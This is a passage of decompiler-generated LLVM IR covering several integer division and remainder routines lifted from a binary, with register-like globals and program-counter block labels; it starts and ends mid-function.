  br i1 %tmp, label %dec_label_pc_c974, label %dec_label_pc_ca00

dec_label_pc_c974:                                ; preds = %dec_label_pc_c96c
  %v1_c974 = load i32, i32* %r2.global-to-local, align 4
  %v2_c974 = and i32 %v1_c974, %v1_c96c
  %v4_c974 = icmp eq i32 %v2_c974, 0
  br i1 %v4_c974, label %dec_label_pc_ca0c, label %dec_label_pc_c97c

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c974
  %v3_c97c = icmp ult i32 %v1_c96c, 536870912
  br i1 %v3_c97c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_c97c
  %v4_c980 = mul i32 %v1_c96c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_c97c, %.thread
  %v0_c9a0.pr36.ph = phi i32 [ %v4_c980, %.thread ], [ %v1_c96c, %dec_label_pc_c97c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_c97c ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_c9a0.pr36 = phi i32 [ %v4_c994, %bb81 ], [ %v0_c9a0.pr36.ph, %.preheader.preheader ]
  %v1_c998 = phi i32 [ %v4_c998, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_c98c = icmp ugt i32 %v0_c9a0.pr36, 268435455
  br i1 %v2_c98c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_c9a0thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_c990 = icmp ult i32 %v0_c9a0.pr36, %v0_c96c
  br i1 %v4_c990, label %bb80, label %dec_label_pc_c9a0thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_c994 = and i32 %v0_c9a0.pr36, 268435456
  %v3_c994 = icmp eq i32 %v2_c994, 0
  %v4_c994 = mul i32 %v0_c9a0.pr36, 16
  br i1 %v3_c994, label %bb81, label %dec_label_pc_c9a0.loopexit

bb81:                                             ; preds = %bb80
  %v2_c998 = and i32 %v1_c998, 268435456
  %v3_c998 = icmp eq i32 %v2_c998, 0
  %v4_c998 = mul i32 %v1_c998, 16
  store i32 %v4_c998, i32* @r3, align 4
  br i1 %v3_c998, label %.preheader, label %dec_label_pc_c9a0thread-pre-split.loopexit.loopexit

dec_label_pc_c9a0thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_c9ac48.ph = phi i32 [ %v1_c998, %bb ], [ %v4_c998, %bb81 ]
  %v0_c9a0.pr38.ph = phi i32 [ %v0_c9a0.pr36, %bb ], [ %v4_c994, %bb81 ]
  br label %dec_label_pc_c9a0thread-pre-split.loopexit

dec_label_pc_c9a0thread-pre-split.loopexit:       ; preds = %dec_label_pc_c9a0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_c9ac48 = phi i32 [ %v1_c998, %.thread2 ], [ %v1_c9ac48.ph, %dec_label_pc_c9a0thread-pre-split.loopexit.loopexit ]
  %v0_c9a0.pr38 = phi i32 [ %v0_c9a0.pr36, %.thread2 ], [ %v0_c9a0.pr38.ph, %dec_label_pc_c9a0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_c9a0thread-pre-split

dec_label_pc_c9a0thread-pre-split:                ; preds = %dec_label_pc_c9a0thread-pre-split.loopexit, %bb83
  %v1_c9ac46 = phi i32 [ %v1_c9ac48, %dec_label_pc_c9a0thread-pre-split.loopexit ], [ %v3_c9ac, %bb83 ]
  %v0_c9a0.pr = phi i32 [ %v0_c9a0.pr38, %dec_label_pc_c9a0thread-pre-split.loopexit ], [ %v3_c9a8, %bb83 ]
  br label %dec_label_pc_c9a0

dec_label_pc_c9a0.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_c9a0

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c9a0.loopexit, %dec_label_pc_c9a0thread-pre-split
  %v1_c9ac = phi i32 [ %v1_c9ac46, %dec_label_pc_c9a0thread-pre-split ], [ %v1_c998, %dec_label_pc_c9a0.loopexit ]
  %v1_c9a8 = phi i32 [ %v0_c9a0.pr, %dec_label_pc_c9a0thread-pre-split ], [ %v4_c994, %dec_label_pc_c9a0.loopexit ]
  %v2_c9a0 = icmp slt i32 %v1_c9a8, 0
  br i1 %v2_c9a0, label %dec_label_pc_c9b4, label %bb82

bb82:                                             ; preds = %dec_label_pc_c9a0
  %v4_c9a4 = icmp ult i32 %v1_c9a8, %v0_c96c
  br i1 %v4_c9a4, label %bb83, label %dec_label_pc_c9b4

bb83:                                             ; preds = %bb82
  %v3_c9a8 = mul i32 %v1_c9a8, 2
  %v2_c9ac = icmp slt i32 %v1_c9ac, 0
  %v3_c9ac = mul i32 %v1_c9ac, 2
  store i32 %v3_c9ac, i32* @r3, align 4
  br i1 %v2_c9ac, label %dec_label_pc_c9b4, label %dec_label_pc_c9a0thread-pre-split

dec_label_pc_c9b4:                                ; preds = %bb82, %dec_label_pc_c9a0, %bb83
  %v2_c9c059 = phi i32 [ %v3_c9ac, %bb83 ], [ %v1_c9ac, %bb82 ], [ %v1_c9ac, %dec_label_pc_c9a0 ]
  %v1_c9b851 = phi i32 [ %v3_c9a8, %bb83 ], [ %v1_c9a8, %bb82 ], [ %v1_c9a8, %dec_label_pc_c9a0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c9b8

dec_label_pc_c9b8:                                ; preds = %.thread11, %dec_label_pc_c9b4
  %v1_c9ec = phi i32 [ %v4_c9ec, %.thread11 ], [ %v2_c9c059, %dec_label_pc_c9b4 ]
  %v1_c9c0 = phi i32 [ %v0_c9f8, %.thread11 ], [ 0, %dec_label_pc_c9b4 ]
  %v1_c9f0 = phi i32 [ %v4_c9f0, %.thread11 ], [ %v1_c9b851, %dec_label_pc_c9b4 ]
  %v1_c9bc = phi i32 [ %v0_c9e8, %.thread11 ], [ %v0_c96c, %dec_label_pc_c9b4 ]
  %v3_c9b8 = icmp ult i32 %v1_c9bc, %v1_c9f0
  br i1 %v3_c9b8, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_c9b8
  %v3_c9bc = sub i32 %v1_c9bc, %v1_c9f0
  %v3_c9c0 = or i32 %v1_c9c0, %v1_c9ec
  store i32 %v3_c9c0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_c9b8, %bb84
  %v1_c9c8 = phi i32 [ %v1_c9bc, %dec_label_pc_c9b8 ], [ %v3_c9bc, %bb84 ]
  %v1_c9cc = phi i32 [ %v1_c9c0, %dec_label_pc_c9b8 ], [ %v3_c9c0, %bb84 ]
  %v4_c9c4 = udiv i32 %v1_c9f0, 2
  %v6_c9c4 = icmp ult i32 %v1_c9c8, %v4_c9c4
  br i1 %v6_c9c4, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_c9c8 = urem i32 %v1_c9f0, 2
  %v4_c9c8 = icmp eq i32 %v3_c9c8, 0
  %v6_c9c8 = sub i32 %v1_c9c8, %v4_c9c4
  br i1 %v4_c9c8, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_c9cc = udiv i32 %v1_c9ec, 2
  %v6_c9cc = or i32 %v1_c9cc, %v5_c9cc
  store i32 %v6_c9cc, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_c9d4 = phi i32 [ %v6_c9c8, %bb85 ], [ %v1_c9c8, %.thread7 ], [ %v6_c9c8, %bb86 ]
  %v1_c9d8 = phi i32 [ %v1_c9cc, %bb85 ], [ %v1_c9cc, %.thread7 ], [ %v6_c9cc, %bb86 ]
  %v4_c9d0 = udiv i32 %v1_c9f0, 4
  %v6_c9d0 = icmp ult i32 %v1_c9d4, %v4_c9d0
  br i1 %v6_c9d0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_c9d4 = and i32 %v1_c9f0, 2
  %v4_c9d4 = icmp eq i32 %v3_c9d4, 0
  %v6_c9d4 = sub i32 %v1_c9d4, %v4_c9d0
  br i1 %v4_c9d4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_c9d8 = udiv i32 %v1_c9ec, 4
  %v6_c9d8 = or i32 %v1_c9d8, %v5_c9d8
  store i32 %v6_c9d8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_c9e0 = phi i32 [ %v6_c9d4, %bb87 ], [ %v1_c9d4, %.thread8 ], [ %v6_c9d4, %bb88 ]
  %v1_c9e4 = phi i32 [ %v1_c9d8, %bb87 ], [ %v1_c9d8, %.thread8 ], [ %v6_c9d8, %bb88 ]
  %v4_c9dc = udiv i32 %v1_c9f0, 8
  %v6_c9dc = icmp ult i32 %v1_c9e0, %v4_c9dc
  br i1 %v6_c9dc, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_c9e0 = and i32 %v1_c9f0, 4
  %v4_c9e0 = icmp eq i32 %v3_c9e0, 0
  %v6_c9e0 = sub i32 %v1_c9e0, %v4_c9dc
  br i1 %v4_c9e0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_c9e4 = udiv i32 %v1_c9ec, 8
  %v6_c9e4 = or i32 %v1_c9e4, %v5_c9e4
  store i32 %v6_c9e4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_c9f8 = phi i32 [ %v1_c9e4, %bb89 ], [ %v1_c9e4, %.thread9 ], [ %v6_c9e4, %bb90 ]
  %v0_c9e8 = phi i32 [ %v6_c9e0, %bb89 ], [ %v1_c9e0, %.thread9 ], [ %v6_c9e0, %bb90 ]
  %v2_c9e8 = icmp eq i32 %v0_c9e8, 0
  br i1 %v2_c9e8, label %dec_label_pc_c9f8, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_c9ec = udiv i32 %v1_c9ec, 16
  store i32 %v4_c9ec, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_c9ec, 16
  br i1 %tmp138, label %dec_label_pc_c9f8, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_c9f0 = udiv i32 %v1_c9f0, 16
  br label %dec_label_pc_c9b8

dec_label_pc_c9f8:                                ; preds = %thread-pre-split, %bb91
  ret i32 %v0_c9f8

dec_label_pc_ca00:                                ; preds = %dec_label_pc_c96c
  %v9_c96c = icmp eq i32 %v0_c96c, %v1_c96c
  %. = zext i1 %v9_c96c to i32
  ret i32 %.

dec_label_pc_ca0c:                                ; preds = %dec_label_pc_c974
  %v2_ca0c = icmp ugt i32 %v1_c96c, 65535
  br i1 %v2_ca0c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_ca0c
  %v2_ca10 = and i32 %v1_c96c, 32768
  %v3_ca10 = icmp eq i32 %v2_ca10, 0
  %v4_ca10 = udiv i32 %v1_c96c, 65536
  br i1 %v3_ca10, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_ca0c
  %v0_ca1c65 = phi i32 [ %v1_c96c, %dec_label_pc_ca0c ], [ %v4_ca10, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_ca20 = phi i32 [ %v0_ca1c65, %.thread16 ], [ %v4_ca10, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_ca1c = icmp ugt i32 %v1_ca20, 255
  br i1 %v2_ca1c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_ca20 = and i32 %v1_ca20, 128
  %v3_ca20 = icmp eq i32 %v2_ca20, 0
  %v4_ca20 = udiv i32 %v1_ca20, 256
  br i1 %v3_ca20, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_ca24 = or i32 %storemerge, 8
  store i32 %v2_ca24, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_ca30 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_ca24, %bb98 ]
  %v1_ca2c = phi i32 [ %v1_ca20, %bb96 ], [ %v4_ca20, %bb97 ], [ %v4_ca20, %bb98 ]
  %v2_ca28 = icmp ugt i32 %v1_ca2c, 15
  br i1 %v2_ca28, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_ca2c = and i32 %v1_ca2c, 8
  %v3_ca2c = icmp eq i32 %v2_ca2c, 0
  %v4_ca2c = udiv i32 %v1_ca2c, 16
  br i1 %v3_ca2c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_ca30 = add nsw i32 %v1_ca30, 4
  store i32 %v2_ca30, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_ca38 = phi i32 [ %v1_ca30, %.thread17 ], [ %v1_ca30, %bb99 ], [ %v2_ca30, %bb100 ]
  %v5_ca3c = phi i32 [ %v1_ca2c, %.thread17 ], [ %v4_ca2c, %bb99 ], [ %v4_ca2c, %bb100 ]
  %v2_ca34 = icmp ugt i32 %v5_ca3c, 3
  %v7_ca34 = icmp eq i32 %v5_ca3c, 4
  %v2_ca38 = xor i1 %v7_ca34, true
  %v3_ca38 = and i1 %v2_ca34, %v2_ca38
  br i1 %v3_ca38, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_ca38 = add nsw i32 %v4_ca38, 3
  store i32 %v5_ca38, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_ca3c = phi i32 [ %v4_ca38, %.thread18 ], [ %v5_ca38, %bb101 ]
  %v2_ca3c = xor i1 %v2_ca34, true
  %v3_ca3c = or i1 %v7_ca34, %v2_ca3c
  br i1 %v3_ca3c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_ca3c = udiv i32 %v5_ca3c, 2
  %v9_ca3c = add i32 %v4_ca3c, %v8_ca3c
  store i32 %v9_ca3c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_ca40 = phi i32 [ %v4_ca3c, %bb102 ], [ %v9_ca3c, %bb103 ]
  %v6_ca40 = lshr i32 %v0_c96c, %v1_ca40
  ret i32 %v6_ca40

dec_label_pc_ca48:                                ; preds = %dec_label_pc_c960
  %v0_ca48 = load i32, i32* @lr, align 4
  %v0_ca4c = call i32 @function_cbb8()
  store i32 %v0_ca48, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_ca3c, { 1, 0 }
  uselistorder i1 %v7_ca34, { 1, 0 }
  uselistorder i32 %v4_ca2c, { 1, 0 }
  uselistorder i32 %v1_ca2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ca24, { 1, 0 }
  uselistorder i32 %v4_ca20, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ca20, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ca10, { 1, 0 }
  uselistorder i32 %v0_c9e8, { 1, 0 }
  uselistorder i32 %v4_c9dc, { 1, 0 }
  uselistorder i32 %v1_c9e4, { 1, 2, 0 }
  uselistorder i32 %v4_c9d0, { 1, 0 }
  uselistorder i32 %v1_c9d8, { 1, 2, 0 }
  uselistorder i32 %v4_c9c4, { 1, 0 }
  uselistorder i32 %v1_c9cc, { 1, 2, 0 }
  uselistorder i32 %v1_c9f0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_c9c0, { 1, 0 }
  uselistorder i32 %v3_c9ac, { 2, 0, 1 }
  uselistorder i32 %v3_c9a8, { 1, 0 }
  uselistorder i32 %v1_c9a8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_c9ac, { 1, 2, 0, 3 }
  uselistorder i32 %v4_c998, { 2, 0, 1 }
  uselistorder i32 %v4_c994, { 2, 1, 0 }
  uselistorder i32 %v1_c998, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_c9a0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_c96c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_c96c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_c960, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_c9f8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_c9b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c9a0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_ca5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ca5c:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_ca60 = call i32 @function_c960()
  ret i32 %v0_ca60
}

define i32 @function_ca74() local_unnamed_addr {
dec_label_pc_ca74:
  %v0_ca74 = load i32, i32* @r1, align 4
  %v1_ca74 = icmp slt i32 %v0_ca74, 0
  %v2_ca74 = icmp eq i32 %v0_ca74, 0
  %v0_ca78 = load i32, i32* @r0, align 4
  %v2_ca78 = xor i32 %v0_ca78, %v0_ca74
  br i1 %v2_ca74, label %dec_label_pc_cb8c, label %dec_label_pc_ca80

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca74
  br i1 %v1_ca74, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_ca80
  %v2_ca80 = sub i32 0, %v0_ca74
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_ca80, %bb
  %v1_cb4c = phi i32 [ %v2_ca80, %bb ], [ %v0_ca74, %dec_label_pc_ca80 ]
  %v1_ca84 = add i32 %v1_cb4c, -1
  %v7_ca84 = icmp eq i32 %v1_cb4c, 1
  br i1 %v7_ca84, label %dec_label_pc_cb2c, label %dec_label_pc_ca8c

dec_label_pc_ca8c:                                ; preds = %thread-pre-split
  %v1_ca8c = icmp slt i32 %v0_ca78, 0
  br i1 %v1_ca8c, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_ca8c
  %v2_ca90 = sub i32 0, %v0_ca78
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_ca8c, %bb84
  %v0_cb80 = phi i32 [ %v0_ca78, %dec_label_pc_ca8c ], [ %v2_ca90, %bb84 ]
  %v3_ca94 = icmp uge i32 %v0_cb80, %v1_cb4c
  %v9_ca94 = icmp eq i32 %v0_cb80, %v1_cb4c
  %v2_ca98 = xor i1 %v3_ca94, true
  %v3_ca98 = or i1 %v9_ca94, %v2_ca98
  br i1 %v3_ca98, label %dec_label_pc_cb38, label %dec_label_pc_ca9c

dec_label_pc_ca9c:                                ; preds = %bb85
  %v2_ca9c = and i32 %v1_ca84, %v1_cb4c
  %v4_ca9c = icmp eq i32 %v2_ca9c, 0
  br i1 %v4_ca9c, label %dec_label_pc_cb48, label %dec_label_pc_caa4

dec_label_pc_caa4:                                ; preds = %dec_label_pc_ca9c
  %v3_caa4 = icmp ult i32 %v1_cb4c, 536870912
  br i1 %v3_caa4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_caa4
  %v4_caa8 = mul i32 %v1_cb4c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_caa4, %.thread
  %v0_cac8.pr40.ph = phi i32 [ %v4_caa8, %.thread ], [ %v1_cb4c, %dec_label_pc_caa4 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_caa4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_cac8.pr40 = phi i32 [ %v4_cabc, %bb88 ], [ %v0_cac8.pr40.ph, %.preheader.preheader ]
  %v1_cac0 = phi i32 [ %v4_cac0, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_cab4 = icmp ugt i32 %v0_cac8.pr40, 268435455
  br i1 %v2_cab4, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_cac8thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_cab8 = icmp ult i32 %v0_cac8.pr40, %v0_cb80
  br i1 %v4_cab8, label %bb87, label %dec_label_pc_cac8thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_cabc = and i32 %v0_cac8.pr40, 268435456
  %v3_cabc = icmp eq i32 %v2_cabc, 0
  %v4_cabc = mul i32 %v0_cac8.pr40, 16
  br i1 %v3_cabc, label %bb88, label %dec_label_pc_cac8.loopexit

bb88:                                             ; preds = %bb87
  %v2_cac0 = and i32 %v1_cac0, 268435456
  %v3_cac0 = icmp eq i32 %v2_cac0, 0
  %v4_cac0 = mul i32 %v1_cac0, 16
  br i1 %v3_cac0, label %.preheader, label %dec_label_pc_cac8thread-pre-split.loopexit.loopexit

dec_label_pc_cac8thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_cad452.ph = phi i32 [ %v1_cac0, %bb86 ], [ %v4_cac0, %bb88 ]
  %v0_cac8.pr42.ph = phi i32 [ %v0_cac8.pr40, %bb86 ], [ %v4_cabc, %bb88 ]
  br label %dec_label_pc_cac8thread-pre-split.loopexit

dec_label_pc_cac8thread-pre-split.loopexit:       ; preds = %dec_label_pc_cac8thread-pre-split.loopexit.loopexit, %.thread3
  %v1_cad452 = phi i32 [ %v1_cac0, %.thread3 ], [ %v1_cad452.ph, %dec_label_pc_cac8thread-pre-split.loopexit.loopexit ]
  %v0_cac8.pr42 = phi i32 [ %v0_cac8.pr40, %.thread3 ], [ %v0_cac8.pr42.ph, %dec_label_pc_cac8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_cac8thread-pre-split

dec_label_pc_cac8thread-pre-split:                ; preds = %dec_label_pc_cac8thread-pre-split.loopexit, %bb90
  %v1_cad450 = phi i32 [ %v1_cad452, %dec_label_pc_cac8thread-pre-split.loopexit ], [ %v3_cad4, %bb90 ]
  %v2_cacc48 = phi i32 [ %v0_cb80, %dec_label_pc_cac8thread-pre-split.loopexit ], [ %v2_cacc, %bb90 ]
  %v0_cac8.pr = phi i32 [ %v0_cac8.pr42, %dec_label_pc_cac8thread-pre-split.loopexit ], [ %v3_cad0, %bb90 ]
  br label %dec_label_pc_cac8

dec_label_pc_cac8.loopexit:                       ; preds = %bb87
  br label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cac8.loopexit, %dec_label_pc_cac8thread-pre-split
  %v1_cad4 = phi i32 [ %v1_cad450, %dec_label_pc_cac8thread-pre-split ], [ %v1_cac0, %dec_label_pc_cac8.loopexit ]
  %v2_cacc = phi i32 [ %v2_cacc48, %dec_label_pc_cac8thread-pre-split ], [ %v0_cb80, %dec_label_pc_cac8.loopexit ]
  %v1_cad0 = phi i32 [ %v0_cac8.pr, %dec_label_pc_cac8thread-pre-split ], [ %v4_cabc, %dec_label_pc_cac8.loopexit ]
  %v2_cac8 = icmp slt i32 %v1_cad0, 0
  br i1 %v2_cac8, label %dec_label_pc_cadc, label %bb89

bb89:                                             ; preds = %dec_label_pc_cac8
  %v4_cacc = icmp ult i32 %v1_cad0, %v2_cacc
  br i1 %v4_cacc, label %bb90, label %dec_label_pc_cadc

bb90:                                             ; preds = %bb89
  %v3_cad0 = mul i32 %v1_cad0, 2
  %v2_cad4 = icmp slt i32 %v1_cad4, 0
  %v3_cad4 = mul i32 %v1_cad4, 2
  br i1 %v2_cad4, label %dec_label_pc_cadc, label %dec_label_pc_cac8thread-pre-split

dec_label_pc_cadc:                                ; preds = %bb89, %dec_label_pc_cac8, %bb90
  %v2_cae863 = phi i32 [ %v3_cad4, %bb90 ], [ %v1_cad4, %bb89 ], [ %v1_cad4, %dec_label_pc_cac8 ]
  %v1_cae055 = phi i32 [ %v3_cad0, %bb90 ], [ %v1_cad0, %bb89 ], [ %v1_cad0, %dec_label_pc_cac8 ]
  br label %dec_label_pc_cae0

dec_label_pc_cae0:                                ; preds = %.thread13, %dec_label_pc_cadc
  %v1_cb14 = phi i32 [ %v4_cb14, %.thread13 ], [ %v2_cae863, %dec_label_pc_cadc ]
  %v1_cae8 = phi i32 [ %v1_cb24, %.thread13 ], [ 0, %dec_label_pc_cadc ]
  %v1_cb18 = phi i32 [ %v4_cb18, %.thread13 ], [ %v1_cae055, %dec_label_pc_cadc ]
  %v1_cae4 = phi i32 [ %v0_cb10, %.thread13 ], [ %v0_cb80, %dec_label_pc_cadc ]
  %v3_cae0 = icmp ult i32 %v1_cae4, %v1_cb18
  br i1 %v3_cae0, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_cae0
  %v3_cae4 = sub i32 %v1_cae4, %v1_cb18
  %v3_cae8 = or i32 %v1_cae8, %v1_cb14
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_cae0, %bb91
  %v1_caf0 = phi i32 [ %v1_cae4, %dec_label_pc_cae0 ], [ %v3_cae4, %bb91 ]
  %v1_caf4 = phi i32 [ %v1_cae8, %dec_label_pc_cae0 ], [ %v3_cae8, %bb91 ]
  %v4_caec = udiv i32 %v1_cb18, 2
  %v6_caec = icmp ult i32 %v1_caf0, %v4_caec
  br i1 %v6_caec, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_caf0 = urem i32 %v1_cb18, 2
  %v4_caf0 = icmp eq i32 %v3_caf0, 0
  %v6_caf0 = sub i32 %v1_caf0, %v4_caec
  br i1 %v4_caf0, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_caf4 = udiv i32 %v1_cb14, 2
  %v6_caf4 = or i32 %v1_caf4, %v5_caf4
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_cafc = phi i32 [ %v6_caf0, %bb92 ], [ %v1_caf0, %.thread8 ], [ %v6_caf0, %bb93 ]
  %v1_cb00 = phi i32 [ %v1_caf4, %bb92 ], [ %v1_caf4, %.thread8 ], [ %v6_caf4, %bb93 ]
  %v4_caf8 = udiv i32 %v1_cb18, 4
  %v6_caf8 = icmp ult i32 %v1_cafc, %v4_caf8
  br i1 %v6_caf8, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_cafc = and i32 %v1_cb18, 2
  %v4_cafc = icmp eq i32 %v3_cafc, 0
  %v6_cafc = sub i32 %v1_cafc, %v4_caf8
  br i1 %v4_cafc, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_cb00 = udiv i32 %v1_cb14, 4
  %v6_cb00 = or i32 %v1_cb00, %v5_cb00
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_cb08 = phi i32 [ %v6_cafc, %bb94 ], [ %v1_cafc, %.thread9 ], [ %v6_cafc, %bb95 ]
  %v1_cb0c = phi i32 [ %v1_cb00, %bb94 ], [ %v1_cb00, %.thread9 ], [ %v6_cb00, %bb95 ]
  %v4_cb04 = udiv i32 %v1_cb18, 8
  %v6_cb04 = icmp ult i32 %v1_cb08, %v4_cb04
  br i1 %v6_cb04, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_cb08 = and i32 %v1_cb18, 4
  %v4_cb08 = icmp eq i32 %v3_cb08, 0
  %v6_cb08 = sub i32 %v1_cb08, %v4_cb04
  br i1 %v4_cb08, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_cb0c = udiv i32 %v1_cb14, 8
  %v6_cb0c = or i32 %v1_cb0c, %v5_cb0c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_cb24 = phi i32 [ %v1_cb0c, %bb96 ], [ %v1_cb0c, %.thread10 ], [ %v6_cb0c, %bb97 ]
  %v0_cb10 = phi i32 [ %v6_cb08, %bb96 ], [ %v1_cb08, %.thread10 ], [ %v6_cb08, %bb97 ]
  %v2_cb10 = icmp eq i32 %v0_cb10, 0
  br i1 %v2_cb10, label %dec_label_pc_cb20, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_cb14, 16
  br i1 %tmp, label %dec_label_pc_cb20, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_cb14 = udiv i32 %v1_cb14, 16
  %v4_cb18 = udiv i32 %v1_cb18, 16
  br label %dec_label_pc_cae0

dec_label_pc_cb20:                                ; preds = %thread-pre-split12, %bb98
  %v1_cb20 = icmp slt i32 %v2_ca78, 0
  br i1 %v1_cb20, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_cb20
  %v2_cb24 = sub i32 0, %v1_cb24
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_cb2c, %dec_label_pc_cb20, %bb99
  %v1_cb28 = phi i32 [ %v1_cb24, %dec_label_pc_cb20 ], [ %v2_cb24, %bb99 ], [ %v2_cb30, %bb100 ], [ undef, %dec_label_pc_cb2c ], [ %v1_cb4480, %bb102 ], [ %v2_cb40, %bb103 ]
  ret i32 %v1_cb28

